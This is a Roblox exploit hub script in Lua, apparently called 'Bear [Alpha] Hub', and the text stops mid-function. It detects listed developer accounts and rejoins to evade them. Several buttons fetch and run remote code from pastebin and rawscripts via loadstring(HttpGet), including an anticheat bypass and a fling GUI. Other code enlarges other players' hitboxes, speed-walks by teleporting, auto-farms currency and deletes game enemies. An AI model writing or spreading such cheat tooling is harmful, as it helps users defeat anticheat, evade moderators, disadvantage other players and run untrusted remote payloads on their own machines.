local sound = game.Workspace:FindFirstChild("Music")
if sound then
-- Function to check if a sound effect already exists
local function findEffect(className)
for _, effect in ipairs(sound:GetChildren()) do
if effect:IsA(className) then
return effect
end
end
return nil
end

-- Add EqualizerSoundEffect if not present
local eq = findEffect("EqualizerSoundEffect")
if not eq then
eq = Instance.new("EqualizerSoundEffect")
eq.Parent = sound
eq.Enabled = true
eq.HighGain = 0
eq.LowGain = 0
eq.MidGain = 0
end

-- Add ReverbSoundEffect if not present
local reverbEffect = findEffect("ReverbSoundEffect")
if not reverbEffect then
reverbEffect = Instance.new("ReverbSoundEffect")
reverbEffect.Parent = sound
reverbEffect.Enabled = false
reverbEffect.DecayTime = 0.1
reverbEffect.Density = 0
reverbEffect.DryLevel = 0
reverbEffect.WetLevel = 0
end

end


-- Check if the sound instance exists
if not sound then
warn("No sound instance named 'Music' found in Workspace!")
-- We will not return here as the rest of the script is for the GUI and will still work.
end

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")

-- Dev ID list
local DEV_IDS = {
    [53994495]  = "macabreroses",
    [295696228] = "Manny",
    [114931758] = "DaDominator",
    [354426046] = "Shroombaloombie",
}

local function checkForDevs()
    for _, p in ipairs(Players:GetPlayers()) do
        if DEV_IDS[p.UserId] then return p, DEV_IDS[p.UserId] end
    end
    return nil, nil
end

local function doRejoin()
    task.wait(3)
    pcall(function() TeleportService:Teleport(game.PlaceId) end)
end

local devDetectionConnection = nil

local function startDevDetection()
    local dp, dn = checkForDevs()
    if dp then
        print("Dev detected: " .. dn .. ", rejoining...")
        doRejoin()
        return true
    end
    if devDetectionConnection then devDetectionConnection:Disconnect() end
    devDetectionConnection = Players.PlayerAdded:Connect(function(p)
        if DEV_IDS[p.UserId] then
            print("Dev joined: " .. DEV_IDS[p.UserId] .. ", rejoining...")
            doRejoin()
        end
    end)
    return false
end

local function stopDevDetection()
    if devDetectionConnection then devDetectionConnection:Disconnect() devDetectionConnection = nil end
end

startDevDetection()


local CoreGui = game:GetService("CoreGui")

local changed = false

local function changeTitle(title)
    if changed then return false end
    local prompt = title.Parent
    if prompt and prompt.Name == "Prompt" then
        local rayfield = prompt.Parent
        if rayfield and rayfield.Name == "Rayfield" then
            title.Text = "Show BEAR Hub"
            changed = true
            return true
        end
    end
    return false
end

-- Quick initial scan (lightweight, only checks TextLabels named Title)
task.spawn(function()
    task.wait(0.5)  -- Give hub a headstart
    for _, obj in CoreGui:GetDescendants() do
        if obj:IsA("TextLabel") and obj.Name == "Title" then
            if changeTitle(obj) then
                break
            end
        end
    end
end)

-- Efficient: Only reacts when a new Title TextLabel is added anywhere in CoreGui
CoreGui.DescendantAdded:Connect(function(desc)
    if desc:IsA("TextLabel") and desc.Name == "Title" then
        changeTitle(desc)
    end
end)

local Lighting = game:GetService("Lighting")
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
Name = "Bear [Alpha] Hub! By T3CHN0",
Icon = "terminal",
LoadingTitle = "Loading Bear Script...",
LoadingSubtitle = "by T3CHN0",
Theme = "Amethyst", 
DisableRayfieldPrompts = false,
DisableBuildWarnings = false,
ConfigurationSaving = {
Enabled = true,
FolderName = "bruhbdafhubbearhub",
FileName = "ConfigOne"
},
Discord = {
Enabled = true,
Invite = "https://discord.gg/BzNewkpwAc",
RememberJoins = true
},
KeySystem = false,
KeySettings = {
Title = "Ez Key System",
Subtitle = "Key",
Note = "type 'bear' exactly, no ' ",
FileName = "Key",
SaveKey = true,
GrabKeyFromSite = false,
Key = {"bear"}
}
})

Rayfield:Notify({
Title = "Bear [Alpha] Hub! (or BEAR (Alpha) Ultimate Hub)",
Content = "Script is now fully loaded!",
Duration = 2,
Image = "check",
})

local Tab = Window:CreateTab("Main", "menu")

local Section = Tab:CreateSection("Useful Scripts")

local Button = Tab:CreateButton({
Name = "Player Hitbox Controller",
Callback = function()
-- Global Variables (Keep these at the top)
_G.HeadSize = 10
_G.Disabled = true -- True means the custom hitboxes are active

-- Configuration for the GUI
local HEAD_SIZE_MIN = 0
local HEAD_SIZE_MAX = 50

-- References to Roblox Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")

-- Function to set up the hitbox on a character
local function setupHitbox(character)
    if not character or not character:FindFirstChild("HumanoidRootPart") then
        return
    end

    local HumanoidRootPart = character.HumanoidRootPart
    -- Only update if the custom size is not 0
    if _G.HeadSize > 0 then
        HumanoidRootPart.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
        HumanoidRootPart.Transparency = 0.7
        HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
        HumanoidRootPart.Material = Enum.Material.Neon
        HumanoidRootPart.CanCollide = false
    else
        -- Reset to default size (assuming default is Vector3.new(2, 2, 2) for HRP,
        -- but exploits might not be able to get the true default, so we'll just
        -- set Transparency to 1 and let the game handle the rest of the default properties.)
        HumanoidRootPart.Transparency = 1
        -- The rest of the properties are often controlled by the server/client
        -- to prevent issues, we will mostly focus on making it invisible
    end
end

-- Main Logic Loop (Don't Touch)
RunService.RenderStepped:Connect(function()
    if _G.Disabled then
        -- Iterate over all players
        for _, player in ipairs(Players:GetPlayers()) do
            -- Skip the local player
            if player.Name ~= LocalPlayer.Name and player.Character then
                -- Use pcall for safety in an exploit environment
                pcall(setupHitbox, player.Character)
            end
        end
    end
end)


--- GUI Creation ---

-- ScreenGui: The container for all GUI elements
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "HitboxController"
-- Change: Make the ScreenGui property 'ResetOnSpawn' false for persistence
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Frame: The main panel
local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 200, 0, 150)
Frame.Position = UDim2.new(0.5, -100, 0.5, -75) -- Centered
Frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Frame.BorderColor3 = Color3.fromRGB(15, 15, 15)
Frame.Active = true
Frame.Draggable = true -- Allows the user to move it
Frame.Parent = ScreenGui

-- Title Label
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 25)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.Text = "Player hitbox customization"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 18
Title.Parent = Frame

-- --- Minimize Button ---
local MinimizeButton = Instance.new("TextButton")
MinimizeButton.Size = UDim2.new(0, 25, 1, 0)
MinimizeButton.Position = UDim2.new(1, -25, 0, 0) -- Top right corner of the Title
MinimizeButton.Text = "-" -- The minimize symbol
MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeButton.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
MinimizeButton.Font = Enum.Font.SourceSansBold
MinimizeButton.TextSize = 20
MinimizeButton.Parent = Title

local isMinimized = false
local originalFrameSize = Frame.Size -- Store the full size

MinimizeButton.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized

    if isMinimized then
        -- Minimize: Change Frame size and button text
        Frame.Size = UDim2.new(0, 200, 0, 25) -- Only the title bar is visible
        MinimizeButton.Text = "+" -- Change to a 'maximize' symbol
    else
        -- Restore: Change Frame size and button text
        Frame.Size = originalFrameSize
        MinimizeButton.Text = "-" -- Change back to the 'minimize' symbol
    end
end)
-- --- End Minimize Button ---


-- Hitbox Size Text Box Label
local SizeLabel = Instance.new("TextLabel")
SizeLabel.Size = UDim2.new(1, -20, 0, 20)
SizeLabel.Position = UDim2.new(0, 10, 0, 35)
SizeLabel.Text = "Hitbox Size (0 - 50, Current: ".._G.HeadSize..")"
SizeLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
SizeLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
SizeLabel.TextXAlignment = Enum.TextXAlignment.Left
SizeLabel.Font = Enum.Font.SourceSans
SizeLabel.TextSize = 14
SizeLabel.Parent = Frame

-- Hitbox Size Text Box (Input for _G.HeadSize)
local SizeTextBox = Instance.new("TextBox")
SizeTextBox.Size = UDim2.new(1, -20, 0, 25)
SizeTextBox.Position = UDim2.new(0, 10, 0, 60)
SizeTextBox.PlaceholderText = tostring(_G.HeadSize)
SizeTextBox.Text = tostring(_G.HeadSize)
SizeTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
SizeTextBox.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
SizeTextBox.Font = Enum.Font.SourceSans
SizeTextBox.TextSize = 16
SizeTextBox.Parent = Frame

-- Input Handling for Text Box
SizeTextBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        local newSize = tonumber(SizeTextBox.Text)

        if newSize and newSize >= HEAD_SIZE_MIN and newSize <= HEAD_SIZE_MAX then
            _G.HeadSize = newSize
            SizeLabel.Text = "Hitbox Size (0 - 50, Current: ".._G.HeadSize..")"
            print("Hitbox Size set to: " .. _G.HeadSize)
        else
            -- If input is invalid, reset the Text Box text to the current valid size
            SizeTextBox.Text = tostring(_G.HeadSize)
            print("Invalid input! Must be a number between "..HEAD_SIZE_MIN.." and "..HEAD_SIZE_MAX..".")
        end
    end
end)

-- Toggle Button (For _G.Disabled)
local ToggleButton = Instance.new("TextButton")
ToggleButton.Size = UDim2.new(1, -20, 0, 30)
ToggleButton.Position = UDim2.new(0, 10, 0, 100)
ToggleButton.Font = Enum.Font.SourceSansBold
ToggleButton.TextSize = 18
ToggleButton.Parent = Frame

-- Function to update the toggle button's appearance
local function updateToggleButton()
    if _G.Disabled then
        ToggleButton.Text = "Status: ON"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(50, 200, 50) -- Green
    else
        ToggleButton.Text = "Status: OFF"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50) -- Red
    end
end

-- Initial button setup
updateToggleButton()

-- Button click event
ToggleButton.MouseButton1Click:Connect(function()
    _G.Disabled = not _G.Disabled -- Toggle the status
    updateToggleButton()
    print("Hitbox Toggled: " .. (_G.Disabled and "ON" or "OFF"))
    
    -- When disabling, try to reset properties to default (by setting Transparency to 1)
    if not _G.Disabled then
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Name ~= LocalPlayer.Name and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                pcall(function()
                    player.Character.HumanoidRootPart.Transparency = 1
                    -- Other properties (Size, Material, BrickColor) are often
                    -- automatically reverted by the game when a client stops
                    -- forcefully setting them, but setting Transparency is key.
                end)
            end
        end
    end
end)
print("Bear [Alpha] Hub!: Player Hitbox Controller Executed✔")
end,
})

local Button = Tab:CreateButton({
Name = "Nameless Admin Script",
Callback = function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Nameless-admin-reworked-75477"))()
Rayfield:Notify({
Title = "Bear [Alpha] Hub!",
Content = "Tip: Try 'god' command and then try 'fly' command",
Duration = 5,
Image = "info",
})
print("Bear [Alpha] Hub!: Nameless Admin Executed✔")
end,
})

local Button = Tab:CreateButton({
Name = "Bypass Anticheat (you can fly/fling without God mode, also execute this before executing Kill Survivors)",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/7QhAURp2"))() 
print("Bear [Alpha] Hub!: Anticheat Removed✔")
end,
})

local Button = Tab:CreateButton({
Name = "Infinite Stamina (it constantly sprints, unnoticeable fast speed)",
Callback = function()
if _G.__TPWALK_RUNNING then
    _G.__TPWALK_RUNNING:Disconnect()
    _G.__TPWALK_RUNNING = nil
end

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")

local plr = Players.LocalPlayer

local TPWALK_SPEED = 5.275
local BEARTPWALK_SPEED = 4.7
local LADDER_SPEED = 5.275
local SAFE_BUFFER = 0.15

local LADDER_TAGS = { "Ladder", "Climb", "Climbable", "Truss" }

local function getChar()
    return plr.Character or plr.CharacterAdded:Wait()
end

local char = getChar()
local hrp = char:WaitForChild("HumanoidRootPart")
local hum = char:WaitForChild("Humanoid")

plr.CharacterAdded:Connect(function(c)
    char = c
    hrp = c:WaitForChild("HumanoidRootPart")
    hum = c:WaitForChild("Humanoid")
end)

-- Team checks
local function isBear()
    if plr.Team and plr.Team.Name == "Bear" then return true end
    if plr:FindFirstChild("Role") and plr.Role.Value == "Bear" then return true end
    return false
end

local function isSurvivors()
    if plr.Team and plr.Team.Name == "Survivors" then return true end
    if plr:FindFirstChild("Role") and plr.Role.Value == "Survivors" then return true end
    return false
end

-- Raycast params
local rayParams = RaycastParams.new()
rayParams.FilterType = Enum.RaycastFilterType.Blacklist
rayParams.IgnoreWater = true

-- Helpers
local function isLadder(hit)
    if not hit or not hit.Instance then return false end
    local inst = hit.Instance
    for _, tag in ipairs(LADDER_TAGS) do
        if inst.Name:lower():find(tag:lower()) then
            return true
        end
    end
    return false
end

-- Core loop
_G.__TPWALK_RUNNING = RunService.RenderStepped:Connect(function(dt)
    if not (isBear() or isSurvivors()) then return end
    if not hrp or not hum then return end

    rayParams.FilterDescendantsInstances = { char }

    local moveDir = hum.MoveDirection
    if moveDir.Magnitude == 0 then return end

    local speed = isBear() and BEARTPWALK_SPEED or TPWALK_SPEED
    local step = speed * dt
    local stepDir = moveDir.Unit
    local desired = stepDir * step

    -- Thin-part safety
    if Workspace:Raycast(hrp.Position, desired + stepDir * SAFE_BUFFER, rayParams) then
        return
    end

    -- Slope handling
    local downHit = Workspace:Raycast(hrp.Position, Vector3.new(0, -4, 0), rayParams)
    if downHit then
        local normal = downHit.Normal
        desired = desired - normal * desired:Dot(normal)
    end

    -- Ladder logic with smooth horizontal movement
    local ladderCheck = Workspace:Raycast(hrp.Position, hrp.CFrame.LookVector * 1.5, rayParams)
    if ladderCheck and isLadder(ladderCheck) then
        -- vertical climb vector
        local climb = Vector3.new(0, LADDER_SPEED * dt, 0)
        -- combine horizontal movement with vertical climb
        hrp.CFrame = hrp.CFrame + desired + climb
        return
    end

    hrp.CFrame = hrp.CFrame + desired
end)
print("Bear [Alpha] Hub!: Infinite Stamina Executed✔")
end,
})


local Button = Tab:CreateButton({
Name = "OP Fling GUI",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/4nYEdANe"))()
print("Bear [Alpha] Hub!: Fling GUI Loaded✔")
end,
})

-- New Auto Farm Button
local Button = Tab:CreateButton({
Name = "Auto farm script woohoo!",
Callback = function()
-- Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local StarterGui = game:GetService("StarterGui")
local CoreGui = game:GetService("CoreGui")

-- Prevent duplicate execution
if _G.AutoQuidzCollectorRunning then
StarterGui:SetCore("SendNotification", {
Title = "Script Already Running",
Text = "The Auto Quidz Collector is already running!",
Duration = 5
})
return
end
_G.AutoQuidzCollectorRunning = true

-- GUI Setup    
local ScreenGui = Instance.new("ScreenGui")    
ScreenGui.ResetOnSpawn = false -- GUI persists after respawn    
ScreenGui.Parent = CoreGui    

local MainFrame = Instance.new("Frame")    
MainFrame.Size = UDim2.new(0, 200, 0, 150)    
MainFrame.Position = UDim2.new(0.5, -100, 0.1, 0)    
MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)    
MainFrame.BorderSizePixel = 2    
MainFrame.Draggable = true    
MainFrame.Active = true    
MainFrame.Parent = ScreenGui    

local Title = Instance.new("TextLabel")    
Title.Size = UDim2.new(1, 0, 0, 25)    
Title.Text = "Auto Quidz Collector"    
Title.TextColor3 = Color3.new(1, 1, 1)    
Title.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)    
Title.Parent = MainFrame    

local QuidzCounter = Instance.new("TextLabel")    
QuidzCounter.Size = UDim2.new(1, 0, 0, 25)    
QuidzCounter.Position = UDim2.new(0, 0, 0, 30)    
QuidzCounter.Text = "Quidz Collected: 0"    
QuidzCounter.TextColor3 = Color3.new(1, 1, 1)    
QuidzCounter.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)    
QuidzCounter.Parent = MainFrame    

local LevelCounter = Instance.new("TextLabel")    
LevelCounter.Size = UDim2.new(1, 0, 0, 25)    
LevelCounter.Position = UDim2.new(0, 0, 0, 60)    
LevelCounter.Text = "Level: 1"    
LevelCounter.TextColor3 = Color3.new(1, 1, 1)    
LevelCounter.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)    
LevelCounter.Parent = MainFrame    

local StartButton = Instance.new("TextButton")    
StartButton.Size = UDim2.new(1, 0, 0, 30)    
StartButton.Position = UDim2.new(0, 0, 0, 90)    
StartButton.Text = "Start"    
StartButton.TextColor3 = Color3.new(0, 1, 0)    
StartButton.BackgroundColor3 = Color3.new(0, 1, 0)    
StartButton.Parent = MainFrame    

local StopButton = Instance.new("TextButton")    
StopButton.Size = UDim2.new(1, 0, 0, 30)    
StopButton.Position = UDim2.new(0, 0, 0, 120)    
StopButton.Text = "Stop"    
StopButton.TextColor3 = Color3.new(1, 1, 1)    
StopButton.BackgroundColor3 = Color3.new(1, 0, 0)    
StopButton.Parent = MainFrame    

local MinimizeButton = Instance.new("TextButton")    
MinimizeButton.Size = UDim2.new(0, 50, 0, 25)    
MinimizeButton.Position = UDim2.new(1, -50, 0, 0)    
MinimizeButton.Text = "-"    
MinimizeButton.TextColor3 = Color3.new(1, 1, 1)    
MinimizeButton.BackgroundColor3 = Color3.new(0.8, 0.5, 0)    
MinimizeButton.Parent = MainFrame    

-- Variables    
local collecting = false    
local quidzPosition = Vector3.new(408.13, 31.94, -26.91) -- Quidz position    
local cooldown = 0.7 -- Cooldown (unused in the provided loop structure but kept for reference)    
local quidzCollected = 0    
local level = 1    
local quidzPerLevel = 10    
local quidzIncreaseAmount = 5    
local interval = 9    
local doubleQuidz = false  -- New variable for gamepass    

-- Check for Double Quidz Gamepass    
local function checkDoubleQuidz()    
    local gamepassId = 6610211 
    if LocalPlayer:HasPass(gamepassId) then    
        doubleQuidz = true    
    end    
end    

-- Teleport Function    
local function teleportToQuidz()    
    local character = LocalPlayer.Character    
    if character and character:FindFirstChild("HumanoidRootPart") then    
        print("Teleporting to Quidz...") -- Debugging    
        character.HumanoidRootPart.CFrame = CFrame.new(quidzPosition)    
    end    
end    

-- Collection Function    
local function startCollecting()    
    if not collecting then    
        collecting = true    
        while collecting do    
            teleportToQuidz()    

            -- Adjust quidz increase based on the gamepass    
            local quidzToAdd = doubleQuidz and quidzIncreaseAmount * 2 or quidzIncreaseAmount    
            quidzCollected = quidzCollected + quidzToAdd    
            QuidzCounter.Text = "Quidz Collected: " .. quidzCollected    
                
            -- Level up    
            if quidzCollected >= level * quidzPerLevel then    
                level = level + 1    
                LevelCounter.Text = "Level: " .. level    
            end    
                
            print("Quidz Collected: ", quidzCollected) -- Debugging    
            wait(interval) -- Wait 9 secs before next collection    
        end    
    end    
end    

-- Stop Collecting    
local function stopCollecting()    
    collecting = false    
    print("Stopped collecting.") -- Debugging    
end    

-- Minimize GUI    
local minimized = false    
MinimizeButton.MouseButton1Click:Connect(function()    
    minimized = not minimized    
    for _, child in pairs(MainFrame:GetChildren()) do    
        if (child:IsA("TextButton") and child.Name ~= "CloseButton") or child:IsA("TextLabel") then    
            child.Visible = not minimized    
        end    
    end    
    MinimizeButton.Visible = true -- Keep minimize button visible    
    Title.Visible = true -- Keep title visible    
end)    

-- Button Clicks    
StartButton.MouseButton1Click:Connect(startCollecting)    
StopButton.MouseButton1Click:Connect(stopCollecting)    

-- Keep GUI on Respawn    
LocalPlayer.CharacterAdded:Connect(function()    
    wait(1)    
    MainFrame.Parent = ScreenGui    
end)    

-- Notice Message    
StarterGui:SetCore("SendNotification", {    
    Title = "AFK Mode Warning",    
    Text = "Turn on AFK mode! If not, you'll get banned. If on, you're safe!",    
    Duration = 9    
})    
print("Bear [Alpha] Hub!: Auto Farm Script Executed✔")

end,

})

local Button = Tab:CreateButton({  
    Name = "Remove Whitey and Orange Whitey (Permanent and only in Lone House)",  
    Callback = function()  
        local workspace = game.Workspace  
        local found = false  

        -- Function to remove a creature and set up persistence
        local function destroyCreature(creature)
            if creature and (creature.Name == "Creature" and creature.Parent and (creature.Parent.Name == "MazeSock" or creature.Parent.Name == "WhiteyKiller")) then
                local parent = creature.Parent

                creature:Destroy()
                found = true

                if parent then
                    parent.ChildAdded:Connect(function(child)
                        if child.Name == "Creature" then
                            child:Destroy()
                            Rayfield:Notify({
                                Title = "Bear [Alpha] Hub!",
                                Content = "Re-added Killers destroyed!",
                                Duration = 3,
                                Image = "trash-2",
                            })
                            print("Bear [Alpha] Hub!: Re-added Killers destroyed!")
                        end
                    end)
                end
            end
        end

        -- Initial removal
        for _, descendant in ipairs(workspace:GetDescendants()) do
            destroyCreature(descendant)
        end

        -- Notifications
        if found then
            Rayfield:Notify({
                Title = "Bear [Alpha] Hub!",
                Content = "Killers Models removed and persistence enabled!",
                Duration = 5,
                Image = "trash-2",
            })
            print("Bear [Alpha] Hub!: Killers Models removed and persistence enabled✔")
        else
            Rayfield:Notify({
                Title = "Bear [Alpha] Hub!",
                Content = "No Killers found in Workspace!",
                Duration = 3,
                Image = "alert-triangle",
            })
            print("Bear [Alpha] Hub!: No Killers found in Workspace!")
        end
    end,  
})

local Divider = Tab:CreateDivider()

local Section = Tab:CreateSection("Lighting")

local Button = Tab:CreateButton({
Name = "Activate Fullbright Mode",
Callback = function()
Lighting.Brightness = 2
Lighting.ClockTime = 14
Lighting.FogEnd = 100000
Lighting.GlobalShadows = false
Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
print("Bear [Alpha] Hub!: Fullbright Activated✔")
end,
})

local Button = Tab:CreateButton({
Name = "Restore Default Lighting",
Callback = function()
Lighting.Brightness = 2
Lighting.ClockTime = 0
Lighting.GlobalShadows = true
Lighting.FogEnd = 120
Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
print("Bear [Alpha] Hub!: Lighting Reverted✔")
end,
})

local Button = Tab:CreateButton({
Name = "Spectator Lighting Mode",
Callback = function()
Lighting.Brightness = 2
Lighting.ClockTime = 0
Lighting.FogEnd = 100000
Lighting.GlobalShadows = false
Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
print("Bear [Alpha] Hub!: Spectator Lighting Activated✔")
end,
})

local Button = Tab:CreateButton({
Name = "Presets Changer",
Callback = function()
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local Lighting = game:GetService("Lighting")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local camera = workspace.CurrentCamera

-- Settings Storage (persistent through death)
local settings = {
	brightness = 0,
	contrast = 0,
	saturation = 0,
	blur = 0,

	worldMode = "Normal", -- Normal, Monochromatic, Saturatic, Glitchic
	povMode = "Normal",   -- Normal, Vivid, Cinema, Realistic

	guiPosition = UDim2.new(0.5, -200, 0.5, -250),
	minimized = false,

	glitchRotationApplied = false
}

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "VisualEffectsGUI"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 400, 0, 500)
mainFrame.Position = settings.guiPosition
mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 10)
mainCorner.Parent = mainFrame

-- Title Bar
local titleBar = Instance.new("Frame")
titleBar.Name = "TitleBar"
titleBar.Size = UDim2.new(1, 0, 0, 40)
titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
titleBar.BorderSizePixel = 0
titleBar.Parent = mainFrame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 10)
titleCorner.Parent = titleBar

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, -80, 1, 0)
titleLabel.Position = UDim2.new(0, 10, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Presets Changer"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextSize = 18
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.Parent = titleBar

-- Minimize Button
local minimizeBtn = Instance.new("TextButton")
minimizeBtn.Name = "MinimizeBtn"
minimizeBtn.Size = UDim2.new(0, 30, 0, 30)
minimizeBtn.Position = UDim2.new(1, -35, 0, 5)
minimizeBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
minimizeBtn.Text = "-"
minimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
minimizeBtn.TextSize = 20
minimizeBtn.Font = Enum.Font.GothamBold
minimizeBtn.Parent = titleBar

local minBtnCorner = Instance.new("UICorner")
minBtnCorner.CornerRadius = UDim.new(0, 6)
minBtnCorner.Parent = minimizeBtn

-- Content Frame (scrollable)
local contentFrame = Instance.new("ScrollingFrame")
contentFrame.Name = "ContentFrame"
contentFrame.Size = UDim2.new(1, -20, 1, -60)
contentFrame.Position = UDim2.new(0, 10, 0, 50)
contentFrame.BackgroundTransparency = 1
contentFrame.BorderSizePixel = 0
contentFrame.ScrollBarThickness = 6
contentFrame.CanvasSize = UDim2.new(0, 0, 0, 800)
contentFrame.Parent = mainFrame

local contentLayout = Instance.new("UIListLayout")
contentLayout.Padding = UDim.new(0, 10)
contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
contentLayout.Parent = contentFrame

-- Helper Functions
local function createSection(name, parent, layoutOrder)
	local section = Instance.new("Frame")
	section.Name = name .. "Section"
	section.Size = UDim2.new(1, 0, 0, 30)
	section.BackgroundTransparency = 1
	section.LayoutOrder = layoutOrder
	section.Parent = parent

	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, 0, 1, 0)
	label.BackgroundTransparency = 1
	label.Text = name
	label.TextColor3 = Color3.fromRGB(150, 200, 255)
	label.TextSize = 16
	label.Font = Enum.Font.GothamBold
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = section

	return section
end

local function createSlider(name, min, max, default, callback, parent, layoutOrder)
	local sliderFrame = Instance.new("Frame")
	sliderFrame.Name = name .. "Slider"
	sliderFrame.Size = UDim2.new(1, 0, 0, 60)
	sliderFrame.BackgroundTransparency = 1
	sliderFrame.LayoutOrder = layoutOrder
	sliderFrame.Parent = parent

	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, 0, 0, 20)
	label.BackgroundTransparency = 1
	label.Text = name .. ": " .. default
	label.TextColor3 = Color3.fromRGB(220, 220, 220)
	label.TextSize = 14
	label.Font = Enum.Font.Gotham
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = sliderFrame

	local sliderBg = Instance.new("Frame")
	sliderBg.Size = UDim2.new(1, 0, 0, 25)
	sliderBg.Position = UDim2.new(0, 0, 0, 25)
	sliderBg.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
	sliderBg.BorderSizePixel = 0
	sliderBg.Parent = sliderFrame

	local sliderBgCorner = Instance.new("UICorner")
	sliderBgCorner.CornerRadius = UDim.new(0, 6)
	sliderBgCorner.Parent = sliderBg

	local sliderFill = Instance.new("Frame")
	sliderFill.Size = UDim2.new((default - min) / (max - min), 0, 1, 0)
	sliderFill.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
	sliderFill.BorderSizePixel = 0
	sliderFill.Parent = sliderBg

	local sliderFillCorner = Instance.new("UICorner")
	sliderFillCorner.CornerRadius = UDim.new(0, 6)
	sliderFillCorner.Parent = sliderFill

	local dragging = false
	local currentValue = default

	local function updateSlider(input)
		local pos = math.clamp((input.Position.X - sliderBg.AbsolutePosition.X) / sliderBg.AbsoluteSize.X, 0, 1)
		currentValue = min + (max - min) * pos
		sliderFill.Size = UDim2.new(pos, 0, 1, 0)
		label.Text = name .. ": " .. math.floor(currentValue * 10) / 10
		callback(currentValue)
	end

	sliderBg.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			updateSlider(input)
		end
	end)

	sliderBg.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = false
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			updateSlider(input)
		end
	end)

	return sliderFrame
end

local function createButtonGroup(name, options, currentOption, callback, parent, layoutOrder)
	local groupFrame = Instance.new("Frame")
	groupFrame.Name = name .. "Group"
	groupFrame.Size = UDim2.new(1, 0, 0, 80)
	groupFrame.BackgroundTransparency = 1
	groupFrame.LayoutOrder = layoutOrder
	groupFrame.Parent = parent

	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, 0, 0, 20)
	label.BackgroundTransparency = 1
	label.Text = name
	label.TextColor3 = Color3.fromRGB(220, 220, 220)
	label.TextSize = 14
	label.Font = Enum.Font.Gotham
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = groupFrame

	local buttonsFrame = Instance.new("Frame")
	buttonsFrame.Size = UDim2.new(1, 0, 0, 50)
	buttonsFrame.Position = UDim2.new(0, 0, 0, 25)
	buttonsFrame.BackgroundTransparency = 1
	buttonsFrame.Parent = groupFrame

	local buttonLayout = Instance.new("UIGridLayout")
	buttonLayout.CellSize = UDim2.new(0, 85, 0, 35)
